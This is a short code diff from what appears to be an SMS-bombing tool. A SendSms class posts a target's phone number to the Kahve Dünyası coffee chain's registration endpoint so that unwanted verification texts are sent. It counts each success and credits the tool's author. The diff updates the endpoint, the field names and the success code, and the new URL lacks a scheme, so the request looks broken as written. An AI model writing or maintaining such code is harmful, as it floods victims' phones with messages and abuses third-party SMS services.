@@ -15,10 +15,11 @@ class SendSms():
             self.mail = ''.join(choice(ascii_lowercase) for i in range(19))+"@gmail.com"
     def kahve(self):
         try:
-            wmf = requests.post("https://www.kahvedunyasi.com/kayit-ol", data={
-                "mobilenumber": self.phone
+            wmf = requests.post("core.kahvedunyasi.com", data={
+                "mobile_number": self.phone,
+                "token_type":"register_token"
             })
-            if wmf.status_code == 202:
+            if wmf.status_code == 200:
                 print(f"{Fore.LIGHTGREEN_EX}Made By NiqhtBo1 | [+] {Style.RESET_ALL}Başarılı! {self.phone} --> www.kahvedunyasi.com")
                 self.adet += 1   
             else:
